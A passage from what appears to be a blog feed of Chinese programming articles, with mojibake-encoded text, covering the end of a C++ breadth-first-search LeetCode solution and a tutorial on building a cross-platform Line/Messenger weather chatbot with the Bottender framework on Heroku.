&lt; n; ++c) &#123;                        // ä»¥ (r,c) ç‚ºä¸­å¿ƒç¿»ä¸€æ¬¡ matrix                        flip(cur, m, n, r, c);                        // å¦‚æœé‚„æ²’èµ°éé€™å€‹ç›¤é¢ï¼Œæ”¾å…¥ queue                        if(!visited.count(cur)) &#123;                            q.push(cur);                            visited.insert(cur);                        &#125;                        // æŠŠç›¤é¢ç¿»å›ä¾†                        flip(cur, m, n, r, c);                    &#125;                &#125;            &#125;            ++steps;        &#125;        return -1;    &#125;private:    void flip(vector&lt;vector&lt;int&gt;&gt;&amp; mat, int&amp; m, int&amp; n, int&amp; r, int&amp; c) &#123;        // ç¿»é„°å±…        if(r - 1 &gt;= 0) &#123; mat[r-1][c] = (mat[r-1][c] == 1) ? 0 : 1; &#125;        if(r + 1 &lt; m)  &#123; mat[r+1][c] = (mat[r+1][c] == 1) ? 0 : 1; &#125;        if(c - 1 &gt;= 0) &#123; mat[r][c-1] = (mat[r][c-1] == 1) ? 0 : 1; &#125;        if(c + 1 &lt; n)  &#123; mat[r][c+1] = (mat[r][c+1] == 1) ? 0 : 1; &#125;        // ç¿»(r,c)        mat[r][c] = (mat[r][c] == 1) ? 0 : 1;    &#125;    bool allZero(const vector&lt;vector&lt;int&gt;&gt;&amp; mat) &#123;        for(int i = 0; i &lt; mat.size(); ++i) &#123;            for(int j = 0; j &lt; mat[0].size(); ++j) &#123;                if(mat[i][j] != 0) &#123;                    return false;                &#125;            &#125;        &#125;        return true;    &#125;&#125;;

ç¸½çµä»Šå¤©è·Ÿå¤§å®¶ä»‹ç´¹äº†ä¸€å€‹æ–°çš„ pattern - Breadth-First Searchï¼Œä¸Šé¢æä¾›çš„äº”é¡Œæ˜¯è®“å¤§å®¶é«”é©—ä¸€ä¸‹ï¼ŒBFS çœ‹ä¼¼ç°¡å–®çš„ï¼Œå»å¯ä»¥æ‡‰ç”¨åœ¨å¾ˆå¤šä¹çœ‹ä¹‹ä¸‹ä¸æœƒè¯æƒ³åˆ° BFS çš„é¡Œç›®ã€‚èƒ½å¤ é«”é©—åˆ°é€™ä¸€å±¤ï¼Œå°±æ˜¯ä½ å¯ä»¥é–‹å§‹éˆæ´»é‹ç”¨ BFS çš„èµ·é»ã€‚åˆ·é¡Œä¸åªæ˜¯ç‚ºäº†é€šéé¢è©¦ï¼Œè€Œæ˜¯åŠ å¼·è‡ªå·±å°è³‡çµå’Œæ¼”ç®—æ³•çš„æ´è¦‹å’Œé«”é©—ï¼Œé€²è€Œå„ªé›…æœ‰æ•ˆç‡åœ°è§£æ±ºå·¥ç¨‹å•é¡Œï¼Œå…±å‹‰ä¹‹ã€‚
å»¶ä¼¸é–±è®€
Leetcode åˆ·é¡Œ pattern - Two Pointer
Leetcode åˆ·é¡Œ pattern - Sliding Window
Leetcode åˆ·é¡Œ pattern - Next Greater Element
Leetcode åˆ·é¡Œ pattern - Fast &amp; Slow Pointer

é—œæ–¼ä½œè€…ï¼š@pojenlai æ¼”ç®—æ³•å·¥ç¨‹å¸«ï¼Œå°æ©Ÿå™¨äººã€é›»è…¦è¦–è¦ºå’Œäººå·¥æ™ºæ…§æœ‰å°‘è¨±ç ”ç©¶ï¼Œæ­£è‡´åŠ›æ”¹å–„ è‡ªå·±çš„ç¿’æ…£ã€‚
]]></content>
  </entry>
  <entry>
    <title>ä¾†å¯«å€‹æ°£è±¡æ©Ÿå™¨äººå§ï¼(Part 1)</title>
    <url>/2018/05/10/lets-build-weather-bot-1/</url>
    <content><![CDATA[Letâ€™s build a weather bot!
ç°¡ä»‹æ²’æœ‰äººæœƒæ‡·ç–‘äº†è§£å¤©æ°£çš„é‡è¦æ€§ï¼Œæˆ‘å€‘ç¸½æ˜¯çœ‹æ°£è±¡é å ±æˆ–æŸ¥å¤©æ°£ä¾†æ±ºå®šç­‰ä¸‹å¤–å‡ºæ™‚è¦ä¸è¦å¸¶å‚˜ï¼Œè¡£æœè¦ç©¿å¤šåšæ˜¯å¦éœ€è¦å¸¶ä»¶å¤–å¥—ï¼Œæˆ–æ˜¯éœ€ä¸éœ€è¦å…ˆæ“¦é˜²æ›¬æ²¹æˆ´ä¸€å‰¯å¢¨é¡å‡ºé–€ç­‰ç­‰ã€‚
æƒ³æŸ¥å¤©æ°£çš„æ™‚å€™æˆ‘æƒ³å¤§éƒ¨åˆ†äººå¯èƒ½å°±æ˜¯ Google ä¸€ä¸‹ã€ä¸Šä¸­å¤®æ°£è±¡å±€ç¶²ç«™ã€ä½¿ç”¨ APPã€çœ‹æ–°èã€‚æˆ–æ˜¯æœ‰ç¨®å¾ˆæ½®çš„åšæ³•æ˜¯å• Siriï¼Œä¸éæ•ˆæœå¯èƒ½ä¸å¤ªå¥½ â‹¯â‹¯ã€‚

å…¶å¯¦é‚„æœ‰ä¸€ç¨®åšæ³•æ˜¯å»ºç«‹ä¸€å€‹å¤©æ°£æ©Ÿå™¨äººï¼Œå…¶å¯¦æ¦‚å¿µå°±æ˜¯èŠå¤©æ©Ÿå™¨äººï¼Œè®“æˆ‘å€‘å¯ä»¥å’Œæ©Ÿå™¨äººå°è©±å–å¾—å¤©æ°£è³‡è¨Šã€‚ä½ å¯èƒ½æœƒå•é‚£å’ŒæŸ¥ App æˆ–å• Siri å·®åœ¨å“ªè£¡å‘¢ï¼Ÿé¦–å…ˆæ°£è±¡æ©Ÿå™¨äººå› ç‚ºè‘—é‡åœ¨æ°£è±¡è³‡è¨Šä¸Šï¼Œæ‰€ä»¥è³‡æ–™è™•ç†éå¸¸ç´°è†©ï¼Œå°¤å…¶æ˜¯å°ç£åœ°å€çš„è³‡æ–™æ˜¯è™•ç†å¾—éå¸¸å®Œå–„ï¼Œä¸¦ä¸”åœ‹å¤–åœ°å€ä¹Ÿæ”¯æ´ã€‚å†ä¾†å°±æ˜¯èŠå¤©æ©Ÿå™¨äººæœ€å¥½ç©çš„åœ°æ–¹å°±æ˜¯ï¼Œå¤§å®¶å¯ä»¥ä¸€èµ·è·Ÿæ©Ÿå™¨äººå°è©±ï¼Œé€™ä¹Ÿæ˜¯èŠå¤©æ©Ÿå™¨äººæœ€å¥½ç©çš„åœ°æ–¹ï¼

æ©Ÿå™¨äººåœ¨ç¾¤çµ„ä¸­å¯ä»¥å’Œå¤§å®¶ä¸€èµ·äº’å‹•ï¼Œç•¶æœ‰äººæåˆ°å¤©æ°£è³‡è¨Šçš„æ™‚å€™ï¼Œæ©Ÿå™¨äººæœƒè‡ªå‹•å›æ‡‰ï¼Œä¸åƒ…å°‘äº†æŸ¥è©¢çš„æ™‚é–“ï¼Œå¤§å®¶ä¹Ÿéƒ½èƒ½ä¸€èµ·å¾—åˆ°æ°£è±¡è³‡è¨Šã€‚æ­¤å¤–ä¹Ÿå¯ä»¥åšå€‹äººæŸ¥è©¢ä½¿ç”¨ï¼Œä¸¦ä¸”æ”¯æ´è·¨å¹³å°ï¼Œå¯ä»¥åœ¨ Line æˆ– Messenger ç”šè‡³å…¶ä»–èŠå¤©è»Ÿé«”ä¸Šä½¿ç”¨ã€‚
å¯ä»¥å…ˆç©çœ‹çœ‹ï¼Œç¬¬ä¸€æ¬¡ä½¿ç”¨è«‹å…ˆè¼¸å…¥ help ä¾†æŸ¥çœ‹æŒ‡ä»¤ï¼š

æ°£è±¡æ©Ÿå™¨äºº Messenger Bot é€£çµ
æ°£è±¡æ©Ÿå™¨äºº Line Bot é€£çµ

æ¥ä¸‹ä¾†æˆ‘æœƒä»‹ç´¹å¦‚ä½•å»ºç«‹ä¸€å€‹æ°£è±¡æ©Ÿå™¨äººï¼Œä¸€ä¸€ä»‹ç´¹èŠå¤©æ©Ÿå™¨äººå»ºç«‹ã€ä½¿ç”¨ Bottender æ¡†æ¶ã€éƒ¨ç½²ã€æ¯”è¼ƒç´°ç¯€çš„è¨­å®šã€æ°£è±¡è³‡æ–™çš„ä¾†æºå’Œè™•ç†ã€‚æœ¬ç¯‡å±¬æ–¼é€²éšçš„æ¢è¨æ–‡ç« ï¼ŒåŸºç¤çš„éƒ¨åˆ†ä¸æœƒç‰¹åˆ¥è‘—å¢¨ï¼Œä½†æˆ‘æœƒå°‡éœ€å¿…å‚™çš„åŸºç¤è³‡æ–™éƒ½æä¾›çµ¦å¤§å®¶ã€‚
å¦‚ä½•å»ºç«‹æ©Ÿå™¨äººæƒ³è¦å»ºç«‹ä¸€å€‹æ°£è±¡æ©Ÿå™¨äººï¼Œæœ€é‡è¦çš„ç•¶ç„¶å°±æ˜¯å…ˆæœ‰å€‹æ©Ÿå™¨äººï¼ˆbotï¼‰ã€‚ä¸€èˆ¬çš„èŠå¤©æ©Ÿå™¨äººåŸç†å¤§è‡´éƒ½ç›¸åŒï¼Œä½ æœƒéœ€è¦å»ºç«‹ä¸€å€‹ä¼ºæœå™¨ï¼Œå°±é¡ä¼¼ç¶²é ä¼ºæœå™¨ä¸€æ¨£ï¼Œåªæ˜¯ç¾åœ¨æ˜¯ä¼ºæœæ©Ÿå™¨äººã€‚ç„¶å¾Œä¼ºæœå™¨å¯ä»¥é€é Webhook æ©Ÿåˆ¶èˆ‡èŠå¤©å¹³å°æºé€šï¼ŒèŠå¤©å¹³å°è—‰ç”± Webhook ä¸­çš„è¦æ±‚å‚³é€çµ¦å¹³å°ä½¿ç”¨è€…ã€‚èˆ‰ä¾‹ä¾†èªªï¼Œç•¶æŸå€‹äººå‚³è¨Šæ¯çµ¦æ©Ÿå™¨äººï¼ŒèŠå¤©å¹³å°çš„ä¼ºæœå™¨å°±æœƒçŸ¥é“ï¼Œä¸¦ä¸”é€é API å‚³è¨Šæ¯å‘Šè¨´ä½ çš„ä¼ºæœå™¨ï¼Œèªªæœ‰äººå‚³è¨Šæ¯çµ¦ä½ å–”ï¼ä½ çš„ä¼ºæœå™¨ç¶“éä¸€ç•ªè™•ç†ä¹‹å¾Œï¼Œå¯ä»¥å‘¼å« API å‘Šè¨´èŠå¤©å¹³å°èªªï¼Œè«‹è®“æ©Ÿå™¨äººå›è¦†ä»–ã€Œxxxxxã€ï¼Œé€™å€‹éç¨‹å°±æ˜¯æ‰€è¬‚ Webhook äº†ã€‚
ç”±æ–¼æˆ‘æƒ³åšè·¨å¹³å°çš„æ©Ÿå™¨äººï¼Œæ„å‘³è€…è¦èƒ½åœ¨ Lineã€Messengerã€Telegramã€Slack ç­‰ç­‰èŠå¤©å¹³å°ä¸Šéƒ½èƒ½ä½¿ç”¨ï¼Œä½†æ˜¯æ¯å®¶å¹³å°çš„ API éƒ½ä¸ç›¡ç›¸åŒï¼Œæ¯å€‹å¹³å°éƒ½è¦ç‰¹åˆ¥å»é‡å°ä»–ä¾†æ”¹çœŸçš„å¾ˆéº»ç…©ï¼Œæœ€ä½³çš„å¯¦ä½œæ–¹å¼æ˜¯ä½¿ç”¨æ¡†æ¶ï¼ˆframeworkï¼‰ç•¶ä½œåº•å±¤ï¼Œå¾…æœƒæœƒç´°è«‡ã€‚æˆ‘å€‘å…ˆä¾†çœ‹æ€éº¼ç”³è«‹ã€å¯«ç°¡å–®çš„æ©Ÿå™¨äººå§ï¼
é€™é‚Šæˆ‘é‡å° Line å’Œ ï¼­essenger ä¸€èµ·åšä»‹ç´¹ï¼ŒSlackã€Telegram ç­‰ç­‰å…¶ä»–çš„ç”±æ–¼æˆ‘æ²’æœ‰å»å¯¦ä½œï¼ˆè€ƒæ…®åˆ°ä½¿ç”¨äººæ•¸çš„æ•ˆç›Šï¼‰ä»¥åŠåŸç†å’Œåšæ³•å…¶å¯¦ä¹Ÿä¸æœƒå·®å¤ªå¤šï¼Œå°±ç•™çµ¦å¤§å®¶è‡ªè¡ŒæŸ¥è©¢äº†ã€‚
Line Botæƒ³ä½¿ç”¨ Line Bot çš„è©±ï¼Œè¦å…ˆç”³è«‹ Line@ å¸³è™Ÿï¼Œå¯ä»¥åƒè€ƒ OOXX å¯«çš„ LINE BOT å¯¦æˆ° ( åŸç†ç¯‡ )ã€‚é€™ç¯‡ä»‹ç´¹éå¸¸å®Œæ•´ï¼Œç…§è‘—æ–‡ç« æ­¥é©Ÿï¼Œä½¿ç”¨ NodeJS å¯ä»¥å¿«é€Ÿå»ºç«‹ä¸€å€‹ Hello World Botã€‚é€™é‚Šå¯ä»¥è©¦è‘—å¯«ä¸€å€‹ï¼Œæˆ–æ˜¯ç­‰ä¸‹æœƒä»‹ç´¹ç”¨æ¡†æ¶ä¾†åšã€‚
Line Bot å»ºç«‹éå¸¸æ–¹ä¾¿ï¼Œå¦‚æœè¦é–‹æ”¾å…¬é–‹çµ¦å¤§å®¶ä½¿ç”¨ä¹Ÿå¾ˆå®¹æ˜“ï¼Œåªè¦è®“åˆ¥äººåŠ ä½ çš„æ©Ÿå™¨äººå¥½å‹å°±å¥½ã€‚å®Œå…¨ä¸éœ€è¦å…¶ä»–çš„å¯©æŸ¥æˆ–ç”³è«‹ï¼ˆé™¤éè¦ç”³è«‹èªè­‰å¸³è™Ÿï¼‰ï¼Œç›¸è¼ƒæ–¼ Messenger å¯èªªæ˜¯éå¸¸å‹å–„ã€‚ä¸éå…è²»å¸³è™Ÿåªèƒ½å¤ ã€Œå›æ‡‰ã€ï¼Œä¸èƒ½è®“æ©Ÿå™¨äººä¸»å‹•ã€Œæ¨æ’­ã€ï¼Œé€™æ˜¯èˆ‡ Messenger éå¸¸ä¸åŒçš„åœ°æ–¹ï¼Œå¦‚æœè¦åšåˆ°è·¨å¹³å°ä¸”éƒ½æ”¯æ´ä¸»å‹•æ¨æ’­ï¼Œå°±åªå¥½è²·ä»˜è²»æœå‹™äº†ã€‚
å¦å¤– Line Bot æ‰€æœ‰ Post API åªæ¥å—å…§å®¹ç‚º HTTPS çš„ URLï¼Œä¾‹å¦‚ä½ è¦å‚³é€åœ–ç‰‡çµ¦ä½¿ç”¨è€…ï¼Œä½ å¯ä»¥åœ¨ API ä¸­é™„ä¸Šåœ–ç‰‡çš„ URLï¼Œä½†å¿…é ˆæ˜¯ HTTPS çš„é€£çµï¼Œå¦‚æœæ˜¯ HTTP çš„è©±ï¼ŒLine Bot æœƒä¸åæ‡‰ï¼Œä¸”ä¸æœƒå ±éŒ¯èª¤è¨Šæ¯ã€‚å¸Œæœ›å¤§å®¶ä¸è¦åœ¨é€™åœ°æ–¹è¢«é›·åˆ°äº†ã€‚
Messenger BotMessenger Bot ç›¸è¼ƒæ–¼ Line Bot ä¾†èªªæ›´åŠ å¼·å¤§ï¼Œå› ç‚ºä»–æœ‰æ›´å¤š API å¯ä»¥å‘¼å«ï¼Œå®ƒæ”¯æ´èªæ„åˆ†æç­‰æœå‹™ã€‚ä¸é Messenger Bot ä¸ç›´æ¥æ”¯æ´ç¾¤çµ„èŠå¤©ï¼ˆå¯ä»¥é€éå¤–æ›è¾¦åˆ°ï¼‰ï¼Œä¸¦ä¸”ç”³è«‹æ­¥é©ŸçœŸçš„ç…©ç‘£å¾ˆå¤šã€‚é¦–å…ˆè¦ç”¨ Messenger Bot çš„è©±è¦ç”³è«‹ Facebook Developerï¼Œä¸¦ä¸”ç”³è«‹é–‹ç™¼æ‡‰ç”¨æœå‹™ï¼Œä¸¦ä¸”æ©Ÿå™¨äººå¿…é ˆç¶å®šä¸€å€‹ç²‰çµ²å°ˆé ã€‚è©³ç´°ç”³è«‹æ­¥é©Ÿå¯ä»¥åƒè€ƒè¶…ç°¡æ˜“-Messenger-API-åˆæ¢ã€‚å¯ä»¥åªçœ‹å¦‚ä½•ç”³è«‹ï¼Œå¯¦ä½œçš„éƒ¨ä»½å…ˆäº†è§£å°±å³å¯ã€‚å› ç‚ºç­‰ä¸‹æœƒä»‹ç´¹ç”¨æ¡†æ¶åšã€‚
å¦å¤–å°±æ˜¯å¦‚æœåªè¦è‡ªå·±æ¸¬è©¦æ©Ÿå™¨äººçš„è©±ï¼ŒWebhook è¨­å®šå¥½ä¼ºæœå™¨æœ‰æ¶å¥½å°±å¯ä»¥çœ‹åˆ°å¯ä»¥å’Œæ©Ÿå™¨äººå°è©±ã€‚ä½†æ˜¯å¦‚æœè¦å…¬é–‹çµ¦ä½¿ç”¨è€…ç”¨çš„è©±ï¼Œè¦å…ˆé€šéè‡‰æ›¸çš„å¯©æŸ¥ï¼Œå¯ä»¥çœ‹è‡‰æ›¸å®˜æ–¹æ–‡ä»¶ã€Œæäº¤æ‚¨çš„ Messenger Botã€ä¾†å®Œæˆï¼Œé€šå¸¸è¦å¥½å¹¾å¤©å¯©æŸ¥é€šéä¹‹å¾Œï¼Œä½ çš„ Messenger Bot æ‰èƒ½è¢«å…¶ä»–ä½¿ç”¨è€…ä½¿ç”¨ã€‚
Bottender æ¡†æ¶å¦‚åŒå…ˆå‰æåˆ°ï¼Œé€™æ˜¯å€‹ç™¾å®¶çˆ­é³´çš„æ™‚ä»£ï¼Œæˆ‘å€‘çš„åŠ›æ°£ä¸è¶³ä»¥æ‡‰ä»˜å„ç¨®æ¨™æº–ï¼Œæ–¼æ˜¯ä¹å°±èª•ç”Ÿäº†æ¡†æ¶ã€‚æ¡†æ¶å¹«æˆ‘å€‘æŠŠæœ€åº•å±¤çš„éº»ç…©äº‹éƒ½æ‰“ç†å¥½äº†ï¼Œä¸¦ä¸”æ›¿æˆ‘å€‘è€ƒé‡åˆ°è·¨å¹³å°çš„è­°é¡Œã€‚æ¯”æ–¹èªªå°±å‚³é€è¨Šæ¯ä¾†èªªï¼Œæ¯å€‹å¹³å°éœ€è¦å‘¼å«çš„ API ä¸ç›¡ç›¸åŒï¼ŒåŸæœ¬ä½ å¯èƒ½éœ€è¦å€‹åˆ¥è¨­å®šï¼Œä½†æ˜¯åœ¨ä½¿ç”¨ Bottender é€™é¡æ¡†æ¶ä¹‹å¾Œï¼Œä¸€äº›åƒæ•¸è¨­å®šå¥½ä¹‹å¾Œï¼ˆtokenã€secret ä¹‹é¡çš„ï¼‰ï¼Œä¸€å¾‹åªéœ€è¦å‘¼å« context.sendText å‡½æ•¸ï¼Œä½ ä»€éº¼éƒ½åˆ¥ç®¡ï¼Œä»–å°±å¹«ä½ æå®šäº†ï¼å³ä½¿ä½ åªä½¿ç”¨å–®ä¸€å¹³å°ï¼Œæ¡†æ¶å¹«ä½ è™•ç†åº•å±¤çš„ API è¨­å®šä¹Ÿéå¸¸æ–¹ä¾¿ï¼Œä¸ä¸€å®šè¦è·¨å¹³å°æ‰èƒ½ä½¿ç”¨ã€‚
ç¨å¾®ä»‹ç´¹ä¸€ä¸‹ï¼Œé€™é‚Šå¼•ç”¨ Bottender åœ˜éšŠå¯«çš„æ–‡ç« ï¼š

å„ªæ‹“æŠ•å…¥è¿‘åŠå¹´å¿ƒåŠ›çš„ç”¢å“â€Šâ€”â€Šå¤šå¹³å° Chatbot æ¡†æ¶ã€ŒBottenderã€çµ‚æ–¼å…¬é–‹ä¸¦åœ¨ GitHub é–‹æºã€‚Bottender æ˜¯æˆ‘å€‘åˆ†æå¤šå¥—æ—¢æœ‰é–‹ç™¼æ¡†æ¶ (Framework) å¾Œï¼Œç¶œåˆäº† Chatbot é–‹ç™¼ä¸Šçš„å¯¦å‹™ç¶“é©—ï¼Œä»¥ã€ŒLearn Once, Write Anywhereã€ç‚ºæ ¸å¿ƒç†å¿µï¼Œæ‰€æ‰“é€ å‡ºçš„ä¸€æ¬¾é–‹æº Frameworkï¼Œå…·å‚™éˆæ´»ã€æ¨¡çµ„åŒ–ã€å¤šå¹³å°ç­‰å„ªå‹¢ã€‚

ä½¿ç”¨ Bottender çœŸçš„å¾ˆç°¡å–®ï¼Œæˆ‘å‡è¨­ä½ æœƒç”¨ NodeJS with Expressï¼Œé‚£éº¼æ¦‚å¿µæ ¹æœ¬æ˜¯ä¸€æ¨£çš„ï¼Œé€™é‚Šæˆ‘å€‘ç°¡å–®å»ºç«‹ä¸€å€‹ Line çš„ Hello World Botï¼š
const &#123; LineBot &#125; = require(&#x27;Bottender&#x27;);const &#123; createServer &#125; = require(&#x27;Bottender/express&#x27;);  const bot = new LineBot(&#123;  channelSecret: process.env.channelSecret, // å¡«ä¸Š Channel Secret  accessToken: process.env.accessToken // å¡«ä¸Š Access Token&#125;);  bot.onEvent(async context =&gt; &#123;  await context.sendText(&#x27;Hello World&#x27;);&#125;);  const server = createServer(bot);  server.listen(5000, () =&gt; &#123;  console.log(&#x27;server is running on 5000 port...&#x27;);&#125;);

é€™æ¨£å¯«å®Œå°±æ˜¯æœ€ç°¡å–®çš„ Hello World Bot äº†ï¼Œç›¸è¼ƒæ–¼ä¸Šé¢å¹¾ç¯‡æˆ‘èªªåªéœ€è¦çœ‹æ¦‚å¿µå°±å¥½çš„æ•™å­¸ï¼Œæ˜¯ä¸æ˜¯ç°¡ç´„å¤šäº†ï¼Ÿ
åƒæ•¸è¨­å®šçš„åœ°æ–¹ï¼Œå¯ä»¥çœ‹åˆ° process.env.channelSecret é€™æ¨£çš„å¯«æ³•ï¼Œé€™æ˜¯ä»£è¡¨æˆ‘å€‘ä¸æœƒæŠŠçœŸçš„ Secret æ”¾åœ¨ç¨‹å¼ç¢¼ä¸­ï¼Œæ‰€ä»¥æˆ‘å€‘è®“ç¨‹å¼å¾ç’°å¢ƒè®Šæ•¸ä¸­å–å¾—ï¼Œç’°å¢ƒè®Šæ•¸é€šå¸¸å¯ä»¥åœ¨ä½ æ¶è¨­ä¼ºæœå™¨çš„æœå‹™å•†ç¶²ç«™è¨­å®šï¼Œä»¥ Heroku ç‚ºä¾‹çš„è©±ï¼Œå»ºç«‹ä¸€å€‹ App ä¹‹å¾Œï¼Œå¯ä»¥åœ¨ Setting &gt; Config Vars ä¸­è¨­å®šï¼š

é‚£å‡è¨­æˆ‘å€‘æƒ³è¦è·¨å¹³å°å‘¢ï¼Ÿ
ç†è«–ä¸Šåšæ³•æ‡‰è©²æœ‰å¥½å¤šç¨®ï¼Œé€™é‚Šåˆ†äº«æˆ‘çš„ä½œæ³•ï¼Œä¸éå¯èƒ½ä¸æ˜¯æœ€è°æ˜çš„ï¼Œæˆ‘åœ¨ Heroku å»ºç«‹å…©å€‹ APPï¼Œä¸€å€‹æ˜¯çµ¦ Line å¦å€‹çµ¦ Messengerï¼Œç„¶å¾Œå…©å€‹ Heroku éƒ½ç¶å®š Github repo çš„ masterï¼š
const &#123;    LineBot,    MessengerBot&#125; = require(&#x27;Bottender&#x27;);  const bot = (process.env.chatbotPlatform == &#x27;messenger&#x27;) ?            new MessengerBot(&#123;                accessToken: process.env.messengerAccessToken,                appSecret: process.env.messengerAppSecret,            &#125;) : new LineBot(&#123;                channelSecret: process.env.lineChannelSecret,                accessToken: process.env.lineChannelAccessToken            &#125;);  bot.onEvent(async context =&gt; &#123;  await context.sendText(&#x27;Hello World&#x27;);&#125;);  const server = createServer(bot);  server.listen(5000, () =&gt; &#123;  console.log(&#x27;server is running on 5000 port...&#x27;);&#125;);

å› ç‚ºæˆ‘æƒ³è¦åšåˆ°ä¸€ä»½ç¨‹å¼ç¢¼å¯ä»¥è·¨å¹³å°ï¼Œé€™æ¨£æˆ‘åªéœ€è¦æ›´æ–° master ä¸»å¹¹ï¼Œå°±å¯ä»¥åŒæ™‚è®“å…©å€‹ Heroku APP ä¸€èµ·æ›´æ–°ï¼Œä¸éœ€è¦å†åˆ†åˆ¥ä¿®æ”¹ä¸åŒåˆ†æ”¯ï¼Œå› ç‚ºæ˜¯å¯ä»¥è®“ Heroku å„åˆ¥ç¶å®šä¸åŒçš„åˆ†æ”¯ï¼Œä½†æˆ‘ä¸æƒ³è¦é€™æ¨£ã€‚
æ‰€ä»¥æˆ‘åœ¨ç’°å¢ƒè®Šæ•¸ä¸­è¨­å®šé€™å€‹ Heroku æ˜¯çµ¦å“ªå€‹å¹³å°ç”¨çš„ï¼Œç¨‹å¼ç¢¼é‹è¡Œæ™‚æœƒå¾ç’°å¢ƒè®Šæ•¸ process.env.chatbotPlatform ä¸­å¾—çŸ¥ï¼Œä¸¦åˆå§‹åŒ–å°æ‡‰çš„å¹³å°ï¼Œå› æ­¤å¯ä»¥çœ‹åˆ°æˆ‘æŠŠ LineBot å’Œ MessengerBot åŒæ™‚å¯«é€²å»äº†ã€‚é€™æ¨£å°±æ˜¯ä¸€ç¨®å¯ä»¥è·¨å¹³å°çš„æ–¹æ³•ã€‚
è‡³æ–¼ bot.onEvent() å‰‡æ˜¯è™•ç†å’Œä½¿ç”¨è€…å°è©±çš„éƒ¨åˆ†ï¼Œä¸åŒå¹³å°éƒ½å¯ä»¥å…±ç”¨ã€‚å¦‚æœæœ‰ç‰¹åˆ¥éœ€è¦é‡å°ä¸åŒå¹³å°å®¢è£½çš„è©±ï¼Œå†ç”¨ if åˆ¤æ–·å³å¯ï¼Œæˆ–æ˜¯ç‰¹åˆ¥å¯«å‡½æ•¸è™•ç†ï¼Œå¦‚åŒä»¥ä¸‹å•é¡Œï¼š
Bottender å°ç´°ç¯€é€™é‚Šå¿…é ˆæä¸€ä¸‹ï¼Œç”±æ–¼æˆ‘æ˜¯ Line å…è²»ç‰ˆæ­é… Messengerï¼Œæ‰€ä»¥ Line åªèƒ½å›è¦†ä¸èƒ½æ¨æ’­ï¼Œä½†æ˜¯è‡‰æ›¸å»æ²’æœ‰é€™é™åˆ¶ã€‚é€™å€‹ç‰¹æ€§ä½¿å¾—æˆ‘å€‘ç”¨ Bottender è¦ç‰¹åˆ¥æ³¨æ„ï¼Œå› ç‚º Bottender ä¸­æ²’æœ‰ç‰¹åˆ¥å»å€åˆ†ï¼Œå‡è¨­ä»Šå¤©æˆ‘è¦å›è¦†ç…§ç‰‡ï¼Œåœ¨ Line ä¸Šåªèƒ½ç”¨ context.replyImageï¼Œä½† Messenger è¦ä½¿ç”¨ context.sendImageï¼Œå¯æ˜¯æˆ‘å»ä¸èƒ½ç›´æ¥è®“ Line ä¹Ÿä½¿ç”¨ context.sendImageï¼Œå› ç‚ºä¸»å‹•æ¨æ’­è¦ä½¿ç”¨ä»˜è²»ç‰ˆçš„ Lineï¼Œä¸¦ä¸” Messenger ä¸¦ä¸èƒ½ä½¿ç”¨ context.replyImageã€‚æ–¼æ˜¯å°±æœ‰äº†é€™æ¨£å°·å°¬çš„æƒ…æ³ç™¼ç”Ÿäº†ï¼
ç‚ºäº†è®“å¹³å°å¯ä»¥å…±ç”¨ï¼Œæˆ‘åˆè‡ªå·±åŒ…è£äº†ä¸€å±¤å‡½æ•¸ï¼š
async function platformReplyImage(context, url) &#123;    if (process.env.chatroomPlatform == &#x27;messenger&#x27;) &#123;        await context.sendImage(url)    &#125; else &#123;        await context.replyImage(url);    &#125;&#125;

å¦‚æ­¤ä¸€ä¾†å°±è§£æ±ºäº†ä¸Šè¿°å•é¡Œï¼Œæ­¤å•é¡Œä¹Ÿç™¼ç”Ÿåœ¨ sendText å’Œ replyText ä¸­ï¼Œå¸Œæœ› Bottender å¯ä»¥é‡å°é€™å¡Šæ”¹å–„ï¼Œæˆ‘ä¹Ÿç™¼äº†ä¸€å€‹ issue è¡¨é”æˆ‘çš„æƒ³æ³•ã€‚
æœªå®Œå¾…çºŒä¸‹ä¸€ç¯‡ï¼šä¾†å¯«å€‹æ°£è±¡æ©Ÿå™¨äººå§ï¼(Part 2)ï¼Œå°‡ä»‹ç´¹æ°£è±¡æ©Ÿå™¨äººçš„æ ¸å¿ƒï¼Œæ°£è±¡è³‡æ–™å–å¾—èˆ‡è™•ç†ã€‚

ä½ å¯ä»¥åœ¨é€™é‚ŠæŸ¥çœ‹æ°£è±¡æ©Ÿå™¨äººçš„ Github Repo



é—œæ–¼ä½œè€…åŠ‰å®‰é½Šè»Ÿé«”å·¥ç¨‹å¸«ï¼Œç†±æ„›å¯«ç¨‹å¼ï¼Œæ›´å–œæ­¡æ¨å»£ç¨‹å¼è®“æ›´å¤šäººå­¸æœƒã€‚æ­¡è¿è¿½è¹¤ **å¾®ä¸­å­**ï¼Œæˆ‘æœƒåœ¨ä¸Šé¢åˆ†äº«å„ç¨®æ–°çŸ¥èˆ‡æœ€æ–°ä½œå“ï¼Œä¹Ÿå¯ä»¥å»é€›é€›æˆ‘çš„ å€‹äººç¶²ç«™ æˆ– **Github**ã€‚

]]></content>
      <tags>
        <tag>line-bot</tag>
        <tag>messenger-bot</tag>
        <tag>weather</tag>
        <tag>bot</tag>
      </tags>
  </entry>
  <entry>
    <title>ä¾†å¯«å€‹æ°£è±¡æ©Ÿå™¨äººå§ï¼(Part 2)</title>
    <url>/2018/05/21/lets-build-weather-bot-2/</url>
    <content><![CDATA[Letâ€™s build a weather bot!æ­¤ç¯‡æ‰¿æ¥ä¸Šä¸€ç¯‡ ä¾†å¯«å€‹æ°£è±¡æ©Ÿå™¨äººå§ï¼(Part 1)ã€‚

å¯ä»¥å…ˆç©çœ‹çœ‹æ°£è±¡æ©Ÿå™¨äººï¼Œç¬¬ä¸€æ¬¡ä½¿ç”¨è«‹å…ˆè¼¸å…¥ help ä¾†æŸ¥çœ‹æŒ‡ä»¤ï¼š

æ°£è±¡æ©Ÿå™¨äºº Messenger Bot é€£çµ
æ°£è±¡æ©Ÿå™¨äºº Line Bot é€£çµ

